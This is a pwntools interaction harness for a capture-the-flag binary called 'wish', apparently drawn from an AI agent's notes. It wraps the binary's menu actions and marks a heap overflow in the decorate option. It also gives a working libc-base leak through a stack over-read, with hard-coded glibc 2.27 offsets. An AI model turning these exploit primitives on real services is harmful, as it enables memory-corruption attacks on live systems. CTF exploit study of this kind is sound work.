# wish — 本地/远端交互 harness
# 来源: agent-c44af6a9 (work/wlib.py, 又被 1770c5f4/cba26221 等抄用), KB 侧按已验证事实微调
# 状态: 可跑 —— 2026-09-11 在 aegisx/solver:full + 附件自带 libc + 配套 ld-2.27.so 下验证通过
# 用法: 进程启动方式 process([LD, './wish'], env={'LD_LIBRARY_PATH': '.'})
#       远端直接 remote(host, port), 协议交互完全一致
# 注意: choice7 的提示串以 '\n' 结尾逐字匹配; choice9 的提示串匹配到 '400 square meter\n'
#       (即 "500$ 200 square meter? or 800$ 400 square meter" 的尾部)

from pwn import *
context.log_level = 'error'
import struct


def u64x(b):
    return struct.unpack('<Q', b.ljust(8, b'\x00')[:8])[0]


class Wish:
    # 提示串均为程序实测输出 (KB 2026-09-11 docker 复测)
    MENU = b'What is your wish?\n'

    def __init__(self, remote_addr=None, bin_dir='.'):
        if remote_addr:
            self.p = remote(*remote_addr)
        else:
            # bin_dir 指向 wish/libc.so.6/ld-2.27.so 所在目录 (附件不带 ld,
            # 需从 Ubuntu 18.04 libc6_2.27-3ubuntu1.6 deb 解出配套 ld-2.27.so)
            self.p = process([bin_dir + '/ld-2.27.so', bin_dir + '/wish'],
                             env={'LD_LIBRARY_PATH': bin_dir})
        self.p.recvuntil(self.MENU, timeout=10)

    def wait(self):
        self.p.recvuntil(self.MENU, timeout=10)

    def opt1(self, amount):
        """amount ∈ {50,100,150}, money += amount; 其他值 money=0"""
        self.p.sendline(b'1')
        self.p.recvuntil(b'Which one?\n')
        self.p.sendline(str(amount).encode())
        self.wait()

    def opt2(self):
        """money += rand()%600, srand(time(0)) —— 凑 choice9 所需 money 的彩票机"""
        self.p.sendline(b'2')
        self.wait()

    def opt3(self, size, data=None):
        """size ∈ [0x81,0x4ff]; calloc(1,size) 存入 houses[] 并 read(0,ptr,size)"""
        assert 0x81 <= size <= 0x4ff
        self.p.sendline(b'3')
        self.p.recvuntil(b'What size house do you want?\n')
        self.p.sendline(str(size).encode())
        self.p.recvuntil(b'What do you want to put in the house?\n')
        self.p.send(data if data is not None else b'A' * 8)
        self.wait()

    def opt5(self, idx):
        """free(houses[idx]); houses[idx]=0; 附加 calloc(1,0x20) 触发 unsorted-bin 处理"""
        self.p.sendline(b'5')
        self.p.recvuntil(b'Which big house do you want to abandon?\n')
        self.p.sendline(str(idx).encode())
        self.wait()

    def opt6(self, data):
        """逐字节读 money/100 字节入栈缓冲; 之后 money -= 0x1000000"""
        self.p.sendline(b'6')
        self.p.recvuntil(b'How much do you want?\n')
        self.p.send(data)
        self.wait()

    def opt7(self, d1, d2, d3=b'C'):
        """choice7: 3 次 read(0,rbp-0x60,0x60), 前 2 次后 puts(buf)。不消耗 wishes。
        返回 (print1, print2) 两行原始字节。"""
        self.p.sendline(b'7')
        self.p.recvuntil(b'Okay, brother, what do you want to know?\n')
        self.p.send(d1)
        a = self.p.recvuntil(b'What else do you want to know?\n')
        self.p.send(d2)
        b = self.p.recvuntil(b'You can also ask questions for the last time\n')
        self.p.send(d3)
        self.wait()
        return a, b

    def opt9(self, idx, size, data):
        """decorate: size ∈ {500,800}, 需 money > size-1; read(0, houses[idx], size) —— 堆溢出"""
        assert size in (500, 800)
        self.p.sendline(b'9')
        self.p.recvuntil(b'Which house do you want to decorate?\n')
        self.p.sendline(str(idx).encode())
        self.p.recvuntil(b'400 square meter\n')
        self.p.sendline(str(size).encode())
        self.p.send(data)
        self.wait()


# ---- choice7 泄露配方 (远端已验证, 见 leak7.py) ----
LEAK_OFF_18 = 0x8d3b3    # slot+0x18 = libc + 0x8d3b3 (_IO_file_overflow+0x103)
LEAK_OFF_28 = 0x3ec760   # slot+0x28 = libc + 0x3ec760 (_IO_2_1_stdout_)
LEAK_OFF_38 = 0x80b12    # slot+0x38 = libc + 0x80b12 (puts+0x1a2)
LEAK_DELTA_28_18 = 0x35f3ad


def leak_libc(w):
    """一次 choice7 拿 libc base 并用双槽指纹自校验; 失败抛异常(应重连)。
    slot+0x30 = PIE+0x1c20, slot+0x40 = buf+0x60 (栈) 也可从 print1/print2 解出。"""
    a, b = w.opt7(b'A' * 0x18, b'B' * 0x28)
    line1 = a.split(b'\n')[0]
    line2 = b.split(b'\n')[0]
    s18 = u64x(line1[0x18:0x18 + 6])
    s28 = u64x(line2[0x28:0x28 + 6])
    base = s18 - LEAK_OFF_18
    assert base & 0xfff == 0, 'libc base not page-aligned'
    assert s28 - s18 == LEAK_DELTA_28_18, 'DELTA fingerprint mismatch (libc != 2.27-3ubuntu1.6?)'
    return base, s18, s28
